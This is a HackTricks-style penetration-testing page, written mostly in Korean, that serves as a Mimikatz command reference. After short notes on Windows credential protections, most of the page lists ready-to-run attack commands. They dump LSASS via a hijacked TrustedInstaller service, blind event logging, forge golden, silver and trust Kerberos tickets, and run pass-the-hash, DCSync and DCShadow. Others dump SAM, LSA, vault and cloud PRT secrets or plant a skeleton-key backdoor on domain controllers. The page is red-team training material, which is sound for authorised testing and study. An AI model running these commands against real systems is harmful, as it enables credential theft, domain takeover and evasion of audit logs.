# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**이 페이지는 [adsecurity.org](https://adsecurity.org/?page_id=1821)의 내용을 기반으로 합니다**. 자세한 내용은 원문을 확인하세요!

## LM and Clear-Text in memory

Windows 8.1 및 Windows Server 2012 R2부터 자격 증명 탈취를 방지하기 위해 중요한 조치가 적용되었습니다:

- **LM hashes and plain-text passwords**는 보안을 강화하기 위해 더 이상 메모리에 저장되지 않습니다. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"` 레지스트리 설정은 Digest Authentication을 비활성화하기 위해 DWORD 값 `0`으로 구성되어야 하며, 이를 통해 "clear-text" password가 LSASS에 캐시되지 않도록 보장합니다.

- **LSA Protection**은 무단 메모리 읽기와 코드 인젝션으로부터 Local Security Authority (LSA) 프로세스를 보호하기 위해 도입되었습니다. 이는 LSASS를 protected process로 표시함으로써 이루어집니다. LSA Protection을 활성화하려면:
1. 레지스트리의 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_를 수정하여 `RunAsPPL`을 `dword:00000001`로 설정합니다.
2. 관리되는 장치 전반에 이 레지스트리 변경을 강제하는 Group Policy Object (GPO)를 적용합니다.

이러한 보호 기능에도 불구하고, Mimikatz 같은 도구는 특정 drivers를 사용해 LSA Protection을 우회할 수 있으며, 이런 행위는 event logs에 기록될 가능성이 높습니다.

현대 workstation에서는 이 문제가 더 중요합니다. **Credential Guard는 많은 Windows 11 22H2+ 및 Windows Server 2025 domain-joined, non-DC 시스템에서 기본적으로 활성화되어 있고**, **LSASS-as-PPL은 새 Windows 11 22H2+ 설치에서 기본적으로 활성화됩니다**. 실제로 이는 `sekurlsa::logonpasswords`가 예전 tradecraft가 예상했던 것보다 적은 정보를 제공하는 경우가 많고, 운영자들이 점점 더 **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, 또는 **CloudAP/PRT-oriented modules**로 이동하고 있음을 의미합니다. 보호 측면은 [Windows credentials protections](credentials-protections.md)를 확인하세요.

### Counteracting SeDebugPrivilege Removal

관리자는 일반적으로 SeDebugPrivilege를 가지며, 이를 통해 프로그램을 디버그할 수 있습니다. 이 권한은 공격자가 메모리에서 자격 증명을 추출하는 데 사용하는 일반적인 기법인 무단 memory dump를 방지하기 위해 제한될 수 있습니다. 그러나 이 권한이 제거되더라도, TrustedInstaller 계정은 customized service configuration을 사용해 여전히 memory dump를 수행할 수 있습니다:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
이를 통해 `lsass.exe` 메모리를 파일로 덤프할 수 있으며, 이후 다른 시스템에서 이를 분석하여 credentials를 추출할 수 있습니다:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz의 이벤트 로그 tampering은 두 가지 주요 작업으로 구성됩니다: 이벤트 로그를 지우는 것과, 새 이벤트가 기록되지 않도록 Event service를 패치하는 것입니다. 아래는 이 작업들을 수행하는 명령입니다:

#### Clearing Event Logs

- **Command**: 이 작업은 이벤트 로그를 삭제하여 악성 활동을 추적하기 어렵게 만드는 것을 목표로 합니다.
- Mimikatz는 표준 문서에서 명령줄을 통해 이벤트 로그를 직접 지우는 명령을 직접 제공하지 않습니다. 하지만 이벤트 로그 조작은 보통 Mimikatz 외부의 system tools나 scripts를 사용해 특정 로그를 지우는 방식으로 이루어집니다(예: PowerShell 또는 Windows Event Viewer 사용).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- 이 experimental command는 Event Logging Service의 동작을 수정하도록 설계되어, 사실상 새 이벤트를 기록하지 못하게 합니다.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` command는 Mimikatz가 system services를 수정하는 데 필요한 권한으로 동작하도록 보장합니다.
- 이어서 `event::drop` command가 Event Logging service를 patch합니다.

### Kerberos Ticket Attacks

아래 명령은 빠른 syntax reminder로 사용하세요. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), 그리고 [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) 전용 페이지에는 최신 AES/PAC/opsec 세부 사항이 포함되어 있습니다.

### Golden Ticket Creation

Golden Ticket는 domain-wide access impersonation을 가능하게 합니다. 주요 command와 parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: domain 이름.
- `/sid`: domain의 Security Identifier (SID).
- `/user`: 가장할 username.
- `/krbtgt`: domain의 KDC service account의 NTLM hash.
- `/ptt`: ticket을 memory에 직접 주입합니다.
- `/ticket`: 나중에 사용할 수 있도록 ticket을 저장합니다.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticket는 특정 서비스에 대한 접근 권한을 부여합니다. 주요 명령과 파라미터:

- Command: Golden Ticket와 유사하지만 특정 서비스를 대상으로 함.
- Parameters:
- `/service`: 대상 서비스 지정 (예: cifs, http).
- Other parameters similar to Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket 생성

Trust Ticket은 trust relationship을 활용하여 도메인 간 리소스에 접근할 때 사용됩니다. 주요 명령과 매개변수는 다음과 같습니다:

- Command: Golden Ticket와 유사하지만 trust relationship용입니다.
- Parameters:
- `/target`: 대상 도메인의 FQDN.
- `/rc4`: trust account의 NTLM hash.

예시:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- 현재 사용자 세션의 모든 Kerberos ticket을 나열합니다.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- cache 파일에서 Kerberos ticket을 주입합니다.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- 다른 세션에서 Kerberos ticket을 사용할 수 있게 합니다.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- 세션에서 모든 Kerberos ticket을 지웁니다.
- ticket manipulation commands를 사용하기 전에 충돌을 피하려고 유용합니다.

### Over-Pass-the-Hash / Pass-the-Key

If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate`는 새 콘솔을 띄우는 대신 현재 프로세스를 재사용하므로, 동일한 컨텍스트에서 즉시 `lsadump::dcsync` 같은 것을 실행하고 싶을 때 유용하다.

### Active Directory Tampering

- **DCShadow**: AD object 조작을 위해 일시적으로 머신을 DC처럼 동작하게 만든다. [DCShadow](../active-directory-methodology/dcshadow.md)를 참조.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DC를 흉내 내어 비밀번호 데이터를 요청한다. [DCSync](../active-directory-methodology/dcsync.md)를 참조.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA에서 credentials를 추출한다.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: 컴퓨터 계정의 비밀번호 데이터를 사용해 DC를 가장한다.

- _원문 맥락에서 NetSync에 대한 구체적인 command는 제공되지 않음._

- **LSADUMP::SAM**: 로컬 SAM 데이터베이스에 접근한다.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry에 저장된 secrets를 복호화한다.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: 사용자에게 새 NTLM hash를 설정한다.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication 정보를 가져온다.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** 또는 **hybrid-joined** 호스트에서는 `sekurlsa::cloudap`가 LSASS에서 캐시된 **Primary Refresh Token (PRT)** material을 노출할 수 있다. 관련된 Proof-of-Possession key가 software-protected인 경우, `dpapi::cloudapkd`는 이후 **Pass-the-PRT** workflow에 필요한 clear/derived key material을 도출할 수 있다.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
이것은 key가 TPM-backed일 때 훨씬 더 어려워지지만, hybrid endpoints에서는 확인할 가치가 있습니다. cached CloudAP data가 classic `wdigest` output보다 더 흥미로울 수 있기 때문입니다. cloud-side abuse chain은 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)를 참고하세요.

### Miscellaneous

- **MISC::Skeleton**: DC의 LSASS에 backdoor를 주입합니다.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup rights를 획득합니다.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug privileges를 획득합니다.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: 로그인한 사용자의 credentials를 표시합니다.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 메모리에서 Kerberos tickets를 추출합니다.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: SID와 SIDHistory를 변경합니다.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _원본 문맥에 modify에 대한 특정 command는 없습니다._

- **TOKEN::Elevate**: tokens를 impersonate합니다.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: 여러 RDP sessions를 허용합니다.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions를 나열합니다.
- _원본 문맥에 TS::Sessions에 대한 특정 command는 없습니다._

### Vault

- Windows Vault에서 passwords를 추출합니다.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
